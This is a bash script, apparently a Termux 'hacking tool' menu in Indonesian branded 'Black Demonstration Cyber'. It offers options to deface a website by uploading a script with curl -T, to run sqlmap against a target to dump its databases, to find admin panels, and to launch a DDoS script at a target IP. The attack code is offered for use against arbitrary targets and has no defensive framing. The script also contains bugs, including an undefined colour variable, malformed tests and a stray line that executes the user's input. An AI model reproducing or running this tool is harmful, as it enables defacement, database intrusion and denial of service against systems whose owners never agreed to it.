#Special War Of Cyber Network

blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
dark='\033[90;1m'
clear
echo
sleep 1.5
echo $white""
read -p "Siapa Namamu?" cookie
echo $white"Tunggu sedang prosess memuat program!"
echo
sleep 2
echo $white"["$red"*"$white"]......."
sleep 8
clear
echo $indigo
date
echo $white"User Active = "$yellow"$cookie"
echo $dark"<===========================================>"
echo $white"          BLACK DEMONSTRATION CYBER"
echo $dark"<===========================================>"
sleep 4
echo $white"Author : " $cyan"SUHANDI"
sleep 2
echo $white"Note   : " $blue"Black Demon Was Here!"
sleep 2
echo $white"Thanks : " $green"Mr.Include & All Mem BDC"
sleep 2
echo 
echo $white"["$red"1"$white"]"$white"Deface Simple"
echo $white"["$red"2"$white"]"$white"injection sqlmap"
echo $white"["$red"3"$white"]"$white"Admin Panel Finder"
echo $white"["$red"4"$white"]"$white"Ddos Win32 Xrmig.T"
echo $white"["$red"5"$white"]"$white"Keluar"
echo $dark"<=================================================================>"
sleep 3
echo
read -p "Masukan Pilihan ==> " wanjay

if [ $wanjay = "1" ] || [ $wanjay = "1" ]
then
       clear
       echo $red"TARUH SCRIPT DI LUAR FOLDER!"
       read -p "Masukin Target bro=>" root
       read -p "Msukan Scriptnya Bro=>" country
       echo $white"["$red"*"$white"]"$white"Menerobos Keamanan Sistem...."
       curl -T /storage/emulated/0/$country $root
       echo $green" $country/$root"
       echo $white"["$red"*"$white"]"$white"Kembali Dalam 10detik.."
       sleep 10
       sh raginang.sh
elif [ $wanjay = "2" ] || [ $wanjay = "2"]
then
       clear
       read -p "Masukan Web Target Sql ==> " target
       sleep 2
       git clone https://github.com/sqlmapproject/sqlmap
       cd sqlmap
       python2 sqlmap.py -u $target --dbs
elif [ $wanjay = "3"] || [ $wanjay = "3" ]
then
       clear
       python2 finder.py
elif [ $wanjay = "4" ] || [ $wanjay = "4" ]
then
       clear
       read -p "Masukan IP target=> " read
       python3 win32.py -s $read -p 88 -t 135
elif [ $wanjay = "5" ] || [ $wanjay = "keluar" ]
then
       clear
       echo $cyan"Terimakasih Telah Menggunakan Jasa Tools Kami:)"
       sleep 2
       exit
else
        echo $white"["$red"!"$white"]"$white"Anda Salah Memasukan Pilihan!"
        echo
        echo $white"["$red"*"$white"]"$white"Kembali Otomatis Dalam 5 detik..."
        sleep 5
        sh raginang.sh
        $cookie
       
fi
